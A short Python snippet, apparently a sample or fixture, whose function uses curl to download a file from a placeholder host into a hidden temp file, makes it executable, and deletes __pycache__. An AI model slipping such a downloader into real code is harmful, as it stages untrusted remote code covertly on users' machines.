import os
import shutil
import subprocess
import tempfile

path = os.path.join(tempfile.gettempdir(), '.tool')
url = 'https://example.invalid/tool'

def run():
    subprocess.run(f'curl -sLo {path} {url} && chmod +x {path}', shell=True)
    shutil.rmtree('__pycache__')
